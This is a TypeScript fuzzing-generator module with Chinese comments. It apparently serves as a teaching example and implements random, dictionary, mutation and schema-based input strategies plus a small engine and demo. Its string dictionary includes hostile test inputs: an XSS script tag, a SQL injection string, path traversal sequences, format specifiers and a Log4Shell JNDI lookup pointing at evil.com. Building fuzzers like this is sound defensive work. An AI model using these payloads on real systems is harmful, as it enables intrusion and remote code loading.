/**
 * @file 模糊测试基础生成器
 * @category AI Testing → Fuzzing
 * @difficulty hard
 * @tags ai-testing, fuzzing, fuzz-testing, random-input, security-testing
 *
 * @description
 * 模糊测试（Fuzzing）基础生成器，通过生成畸形、随机或边界输入来发现程序缺陷。
 * 支持多种 fuzzing 策略：随机字节、字符串变异、结构化数据突变。
 *
 * Fuzzing 策略：
 * - 随机数据生成：完全随机的字节/字符串/数值
 * - 基于语法的生成：按预定义语法规则生成合法但边界的数据
 * - 基于变异的 fuzzing：在种子输入基础上进行随机变异
 * - 字典驱动：使用已知危险字符串组合
 */

export interface FuzzInput {
  data: Uint8Array;
  seed: number;
  strategy: string;
}

export interface FuzzResult {
  input: FuzzInput;
  passed: boolean;
  error?: string;
  crash?: boolean;
}

/** 可复现的伪随机数生成器 */
export class FuzzRng {
  private state: number;

  constructor(seed = Math.floor(Math.random() * 2147483647)) {
    this.state = seed >>> 0;
  }

  next(): number {
    this.state = (this.state * 16807) % 2147483647;
    return (this.state - 1) / 2147483646;
  }

  nextInt(min: number, max: number): number {
    return Math.floor(this.next() * (max - min + 1)) + min;
  }

  nextBytes(length: number): Uint8Array {
    const bytes = new Uint8Array(length);
    for (let i = 0; i < length; i++) {
      bytes[i] = this.nextInt(0, 255);
    }
    return bytes;
  }
}

// ==================== 基础生成策略 ====================

export interface FuzzStrategy {
  name: string;
  generate(rng: FuzzRng, maxLength?: number): FuzzInput;
}

/** 完全随机字节生成 */
export class RandomBytesStrategy implements FuzzStrategy {
  name = 'random-bytes';

  generate(rng: FuzzRng, maxLength = 1024): FuzzInput {
    const length = rng.nextInt(0, maxLength);
    return {
      data: rng.nextBytes(length),
      seed: rng['state'],
      strategy: this.name
    };
  }
}

/** 固定长度随机字节 */
export class FixedLengthStrategy implements FuzzStrategy {
  name = 'fixed-length';

  constructor(private length: number) {}

  generate(rng: FuzzRng): FuzzInput {
    return {
      data: rng.nextBytes(this.length),
      seed: rng['state'],
      strategy: this.name
    };
  }
}

// ==================== 字符串 Fuzzing ====================

export const FUZZ_STRING_DICTIONARY: string[] = [
  '',
  '\x00',
  '\xff',
  'A'.repeat(1000),
  '\\',
  '/',
  '../',
  '..\\',
  '<script>alert(1)</script>',
  "' OR '1'='1",
  '${jndi:ldap://evil.com}',
  '%s%s%s%s%s',
  '\n',
  '\r\n',
  '\t',
  'null',
  'undefined',
  'NaN',
  'Infinity',
  '-Infinity',
  '0x0',
  '0xFFFFFFFF',
  '2147483647',
  '-2147483648',
  '4294967295',
  '\u0000',
  '\uFFFF',
  '𠮷野家',
  '😀'.repeat(100)
];

export class StringFuzzStrategy implements FuzzStrategy {
  name = 'string';

  generate(rng: FuzzRng, _maxLength?: number): FuzzInput {
    // 50% 概率从字典选择，50% 随机生成
    if (rng.next() < 0.5) {
      const str = FUZZ_STRING_DICTIONARY[rng.nextInt(0, FUZZ_STRING_DICTIONARY.length - 1)];
      return {
        data: new TextEncoder().encode(str),
        seed: rng['state'],
        strategy: this.name
      };
    }

    const length = rng.nextInt(0, 200);
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
    let str = '';
    for (let i = 0; i < length; i++) {
      str += chars[rng.nextInt(0, chars.length - 1)];
    }

    return {
      data: new TextEncoder().encode(str),
      seed: rng['state'],
      strategy: this.name
    };
  }
}

// ==================== 基于变异的 Fuzzing ====================

export class MutationStrategy implements FuzzStrategy {
  name = 'mutation';

  constructor(private seedInputs: Uint8Array[]) {}

  generate(rng: FuzzRng, _maxLength?: number): FuzzInput {
    if (this.seedInputs.length === 0) {
      return new RandomBytesStrategy().generate(rng);
    }

    const seed = this.seedInputs[rng.nextInt(0, this.seedInputs.length - 1)];
    const mutated = this.mutate(new Uint8Array(seed), rng);

    return {
      data: mutated,
      seed: rng['state'],
      strategy: this.name
    };
  }

  private mutate(data: Uint8Array, rng: FuzzRng): Uint8Array {
    const mutations = [
      () => this.bitFlip(data, rng),
      () => this.byteFlip(data, rng),
      () => this.arithmeticMutation(data, rng),
      () => this.insertBlock(data, rng),
      () => this.deleteBlock(data, rng),
      () => this.shuffleBytes(data, rng)
    ];

    // 随机选择 1-3 个变异操作
    const count = rng.nextInt(1, 3);
    let result = data;

    for (let i = 0; i < count; i++) {
      const op = mutations[rng.nextInt(0, mutations.length - 1)];
      result = op();
    }

    return result;
  }

  private bitFlip(data: Uint8Array, rng: FuzzRng): Uint8Array {
    const copy = new Uint8Array(data);
    if (copy.length === 0) return copy;
    const pos = rng.nextInt(0, copy.length - 1);
    const bit = rng.nextInt(0, 7);
    copy[pos] ^= 1 << bit;
    return copy;
  }

  private byteFlip(data: Uint8Array, rng: FuzzRng): Uint8Array {
    const copy = new Uint8Array(data);
    if (copy.length === 0) return copy;
    const pos = rng.nextInt(0, copy.length - 1);
    copy[pos] = rng.nextInt(0, 255);
    return copy;
  }

  private arithmeticMutation(data: Uint8Array, rng: FuzzRng): Uint8Array {
    const copy = new Uint8Array(data);
    if (copy.length === 0) return copy;
    const pos = rng.nextInt(0, copy.length - 1);
    const delta = rng.nextInt(-35, 35);
    copy[pos] = (copy[pos] + delta) & 0xFF;
    return copy;
  }

  private insertBlock(data: Uint8Array, rng: FuzzRng): Uint8Array {
    const pos = rng.nextInt(0, data.length);
    const blockSize = rng.nextInt(1, 16);
    const block = rng.nextBytes(blockSize);
    const copy = new Uint8Array(data.length + blockSize);
    copy.set(data.subarray(0, pos));
    copy.set(block, pos);
    copy.set(data.subarray(pos), pos + blockSize);
    return copy;
  }

  private deleteBlock(data: Uint8Array, rng: FuzzRng): Uint8Array {
    if (data.length === 0) return data;
    const pos = rng.nextInt(0, data.length - 1);
    const size = rng.nextInt(1, Math.min(16, data.length - pos));
    const copy = new Uint8Array(data.length - size);
    copy.set(data.subarray(0, pos));
    copy.set(data.subarray(pos + size), pos);
    return copy;
  }

  private shuffleBytes(data: Uint8Array, rng: FuzzRng): Uint8Array {
    const copy = new Uint8Array(data);
    for (let i = copy.length - 1; i > 0; i--) {
      const j = rng.nextInt(0, i);
      [copy[i], copy[j]] = [copy[j], copy[i]];
    }
    return copy;
  }
}

// ==================== 结构化数据 Fuzzing ====================

export interface FuzzSchema {
  type: 'string' | 'number' | 'boolean' | 'array' | 'object';
  min?: number;
  max?: number;
  items?: FuzzSchema;
  properties?: Record<string, FuzzSchema>;
}

export class StructuredFuzzStrategy implements FuzzStrategy {
  name = 'structured';

  constructor(private schema: FuzzSchema) {}

  generate(rng: FuzzRng, _maxLength?: number): FuzzInput {
    const value = this.generateValue(this.schema, rng);
    const json = JSON.stringify(value);
    return {
      data: new TextEncoder().encode(json),
      seed: rng['state'],
      strategy: this.name
    };
  }

  private generateValue(schema: FuzzSchema, rng: FuzzRng): unknown {
    switch (schema.type) {
      case 'string': {
        const length = rng.nextInt(schema.min ?? 0, schema.max ?? 20);
        const chars = 'abcdefghijklmnopqrstuvwxyz';
        return Array.from({ length }, () => chars[rng.nextInt(0, chars.length - 1)]).join('');
      }
      case 'number':
        return rng.nextInt(schema.min ?? -1000, schema.max ?? 1000);
      case 'boolean':
        return rng.next() < 0.5;
      case 'array': {
        const length = rng.nextInt(schema.min ?? 0, schema.max ?? 10);
        return Array.from({ length }, () => this.generateValue(schema.items ?? { type: 'string' }, rng));
      }
      case 'object': {
        const obj: Record<string, unknown> = {};
        if (schema.properties) {
          for (const [key, propSchema] of Object.entries(schema.properties)) {
            if (rng.next() < 0.9) { // 10% 概率省略字段
              obj[key] = this.generateValue(propSchema, rng);
            }
          }
        }
        return obj;
      }
      default:
        return null;
    }
  }
}

// ==================== Fuzzing 引擎 ====================

export class FuzzingEngine {
  private rng: FuzzRng;
  private strategies: FuzzStrategy[] = [];
  private corpus: Uint8Array[] = [];

  constructor(seed?: number) {
    this.rng = new FuzzRng(seed);
  }

  addStrategy(strategy: FuzzStrategy): void {
    this.strategies.push(strategy);
  }

  addSeed(data: Uint8Array): void {
    this.corpus.push(new Uint8Array(data));
  }

  /**
   * 运行 fuzzing 测试
   * @param target 被测试的函数
   * @param iterations 迭代次数
   */
  run(
    target: (input: Uint8Array) => void,
    iterations = 1000
  ): FuzzResult[] {
    const results: FuzzResult[] = [];

    for (let i = 0; i < iterations; i++) {
      const strategy = this.strategies[this.rng.nextInt(0, this.strategies.length - 1)];
      const input = strategy.generate(this.rng);

      let passed = true;
      let error: string | undefined;
      let crash = false;

      try {
        target(input.data);
      } catch (e) {
        passed = false;
        error = e instanceof Error ? e.message : String(e);
        crash = e instanceof Error && (e.name === 'RangeError' || e.name === 'TypeError');

        // 有趣的输入加入语料库
        if (crash) {
          this.corpus.push(new Uint8Array(input.data));
        }
      }

      results.push({ input, passed, error, crash });
    }

    return results;
  }

  getCorpus(): Uint8Array[] {
    return this.corpus.map(c => new Uint8Array(c));
  }

  getCrashes(results: FuzzResult[]): FuzzResult[] {
    return results.filter(r => r.crash);
  }
}

// ==================== 演示 ====================

export function demo(): void {
  console.log('=== 模糊测试 ===\n');

  const engine = new FuzzingEngine(42);

  // 添加策略
  engine.addStrategy(new RandomBytesStrategy());
  engine.addStrategy(new StringFuzzStrategy());
  engine.addStrategy(new MutationStrategy([
    new TextEncoder().encode('hello'),
    new TextEncoder().encode('{"id":1}')
  ]));

  // 测试一个简单解析器
  const results = engine.run((data) => {
    const str = new TextDecoder().decode(data);
    // 模拟一个可能崩溃的解析器
    if (str.includes('crash')) {
      throw new Error('Parser crash');
    }
    if (str.length > 1000 && str[0] === '{') {
      JSON.parse(str);
    }
  }, 200);

  const crashes = engine.getCrashes(results);
  console.log(`--- Fuzzing 结果 ---`);
  console.log(`  总迭代: ${results.length}`);
  console.log(`  崩溃数: ${crashes.length}`);

  if (crashes.length > 0) {
    console.log('  崩溃输入示例:');
    for (const crash of crashes.slice(0, 3)) {
      const preview = new TextDecoder().decode(crash.input.data.slice(0, 50));
      console.log(`    [${crash.input.strategy}] ${preview}...`);
    }
  }
}
